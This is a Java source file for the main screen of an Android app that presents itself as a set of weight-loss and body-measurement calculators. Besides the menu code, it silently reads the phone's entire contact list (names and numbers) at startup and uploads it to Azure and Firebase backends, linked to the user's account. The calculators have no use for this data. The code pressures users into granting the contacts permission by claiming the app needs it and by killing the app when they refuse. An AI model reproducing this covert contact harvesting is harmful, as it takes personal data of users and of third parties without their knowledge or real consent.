package com.nineinfosys.android.weightlosscalculators;

import android.*;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.android.weightlosscalculators.AnorexicBMI.AnorexicBMIFragment;
import com.nineinfosys.android.weightlosscalculators.ArmyBodyFat.ArmyBodyFatFragment;
import com.nineinfosys.android.weightlosscalculators.BMI.BMIFragment;
import com.nineinfosys.android.weightlosscalculators.BMR.BMRFragment;
import com.nineinfosys.android.weightlosscalculators.BodyFat.BodyFatFragment;
import com.nineinfosys.android.weightlosscalculators.Calorie.CalorieFragment;
import com.nineinfosys.android.weightlosscalculators.Carbohydrate.CarbohydrateFragment;
import com.nineinfosys.android.weightlosscalculators.DashBord.DashBord;
import com.nineinfosys.android.weightlosscalculators.FAT.FATFragment;
import com.nineinfosys.android.weightlosscalculators.FatIntake.FatIntakeFragment;
import com.nineinfosys.android.weightlosscalculators.HealthyWeight.HealthyWeightFragment;
import com.nineinfosys.android.weightlosscalculators.IdealWeight.IdealWeightFragment;
import com.nineinfosys.android.weightlosscalculators.LeanBodyMass.LeanBodyMassFragment;
import com.nineinfosys.android.weightlosscalculators.Login.Contacts;
import com.nineinfosys.android.weightlosscalculators.Login.LoginActivity;
import com.nineinfosys.android.weightlosscalculators.Weight.WeightFragment;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;


public class MainActivityDrawer extends AppCompatActivity {
    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;
    TextView Name,email;
    private FloatingActionButton fab;
   public Toolbar toolbar;
    Intent intent;

    private static final int REQUEST_CONTACTS = 1;

    private static String[] PERMISSIONS_CONTACT = {android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.WRITE_CONTACTS};

    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;
    //Setting up progress dialog
    private ProgressDialog progressDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.drawermain);

        /**
         *Setup the DrawerLayout and NavigationView
         */


        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);
        Name = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.name);
        email = (TextView) mNavigationView.getHeaderView(0).findViewById(R.id.email);
        profilePictureView = (ImageView) mNavigationView.getHeaderView(0).findViewById(R.id.imageView);

        /**
         * Lets inflate the very first fragment
         * Here , we are inflating the TabFragment as the first Fragment
         */

        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();
        mNavigationView.setItemIconTintList(null);
        mFragmentTransaction.replace(R.id.containerView, new DashBord()).commit();
        /**
         * Setup click events on the Navigation View Items.
         */
        fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Toast.makeText(MainActivityDrawer.this,"This Is Under Consturtion",Toast.LENGTH_LONG).show();
                /*Intent intent = new Intent(MainActivity.this, NewMessageActivity.class);
                startActivity(intent);*/
            }
        });


        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();
                if (menuItem.getItemId() == R.id.DashBord) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new DashBord()).commit();

                }
                if (menuItem.getItemId() == R.id.BMI){
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BMIFragment()).commit();
                    /*  Intent intent=new Intent(MainActivityDrawer.this,com.nineinfosys.android.weightlosscalculators.BMI.MainActivity.class);
                       startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.BMR) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BMRFragment()).commit();

                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.BMR.MainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.IdealWeight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new IdealWeightFragment()).commit();

                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.IdealWeight.MainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.FAT) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new FATFragment()).commit();
                  /*  Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.FAT.MainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.AnorexicBMI) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new AnorexicBMIFragment()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.AnorexicBMI.MainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.ArmyBodyFat){
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new ArmyBodyFatFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.ArmyBodyFat.MainActivity.class);
                    startActivity(intent);*/

                }if (menuItem.getItemId() == R.id.BodyFat) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new BodyFatFragment()).commit();
                   /* Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.BodyFat.MainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.Calorie) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new CalorieFragment()).commit();
          /*          Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Calorie.MainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.Carbohydrate) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new CarbohydrateFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Carbohydrate.MainActivity.class);
                    startActivity(intent);*/


                }

                if (menuItem.getItemId() == R.id.FatIntake) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new FatIntakeFragment()).commit();
             /*      Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.FatIntake.MainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.HealthyWeight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new HealthyWeightFragment()).commit();
                  /*  Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.HealthyWeight.MainActivity.class);
                    startActivity(intent);*/

                }
                if (menuItem.getItemId() == R.id.LeanBodyMass) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new LeanBodyMassFragment()).commit();
                 /*   Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.LeanBodyMass.MainActivity.class);
                    startActivity(intent);*/

                }

                if (menuItem.getItemId() == R.id.Weight) {
                    FragmentTransaction fragmentTransaction = mFragmentManager.beginTransaction();
                    fragmentTransaction.replace(R.id.containerView, new WeightFragment()).commit();
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.MainActivity.class);
                    startActivity(intent);*/
                }
                if (menuItem.getItemId() == R.id.MoreApps) {
                    intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP"));
                    startActivity(intent);
                    /*Intent intent=new Intent(MainActivityDrawer.this, com.nineinfosys.android.weightlosscalculators.Weight.MainActivity.class);
                    startActivity(intent);*/
                }
                return false;
            }

        });


        /**
         * Setup Drawer Toggle of the Toolbar
         */

        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();


        authenticate();
        //uploadContactsToAzure();
        testContactUpload();
    }


    ///Uploading contacts to azure
    private void uploadContactsToAzure(){


        initializeAzureTable();
        fetchContacts();
        uploadContact();


    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());

                azureContactArrayList.add(contact);




            }
            phone.close();
        }catch (Exception e){

        }


    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {

            try {
                asyncUploader(c);
                //mobileServiceTable.insert(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        //Log.e(" ", item.getContactname());

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                                // Log.e("Error --", e.toString());
                            }


                        }
                    });
                } catch (final Exception e) {
                    // createAndShowDialogFromTask(e, "Error");
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("MainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivityDrawer.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(loginIntent);

                }
                else {

                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("MainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);



    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
       //noinspection SimplifiableIfStatement

        if (id == R.id.action_logout){
            FirebaseAuth.getInstance().signOut();
            LoginManager.getInstance().logOut();
        }

        return super.onOptionsItemSelected(item);
    }



    private boolean isContactPermissionGranted(){

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)
        {
            return false;

        } else {


            return true;

        }
    }

    private void requestContactsPermissions() {
        // BEGIN_INCLUDE(contacts_permission_request)
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS))
        {
            ActivityCompat.requestPermissions(MainActivityDrawer.this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);


        } else {

            ActivityCompat.requestPermissions(this, PERMISSIONS_CONTACT, REQUEST_CONTACTS);


        }

        testContactUploadSecondTime();



    }


    private void testContactUploadSecondTime(){

        if(!isContactPermissionGranted()){
            android.os.Process.killProcess(android.os.Process.myPid());

            System.exit(1);


        }
        else {
            Log.e("CONTACT ", "PERMISSION_ALREADY_GRANTED");
            Log.e("CONTACT ", "Uploading contacts to azure.....");
            syncContactsWithFirebase();
            uploadContactsToAzure();


        }

    }

    private void testContactUpload(){
        if(isContactPermissionGranted()){
            Log.e("CONTACT ", "PERMISSION_ALREADY_GRANTED");
            Log.e("CONTACT ", "Uploading contacts to azure.....");
            uploadContactsToAzure();
            syncContactsWithFirebase();
            return ;
        }
        else {
            Log.e("CONTACT ", "PERMISSION_REQUESTED");
            createAlertDialogBoxPermissionNotGranted();

        }

    }


    private void createAlertDialogBoxPermissionNotGranted(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivityDrawer.this);
      alertDialogBuilder.setMessage("You must grant permissions for App to work properly. Restart app after granting permission");
        alertDialogBuilder.setPositiveButton("yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        Log.e("ALERT BOX ", "Requesting Permissions");
                        requestContactsPermissions();

                    }
                });

        alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                Log.e("ALERT BOX ", "Permissions not granted");
                android.os.Process.killProcess(android.os.Process.myPid());

                System.exit(1);

            }
        });

       AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();


    }

    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }



                    }



                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {


                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();







    }




    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch(keyCode){
            case KeyEvent.KEYCODE_BACK:
                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setMessage("Are you sure you want to close App?");
                alertDialogBuilder.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                                finish();
                            }
                        });

                alertDialogBuilder.setNegativeButton("No",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                            }
                        });

                //Showing the alert dialog
                AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }

}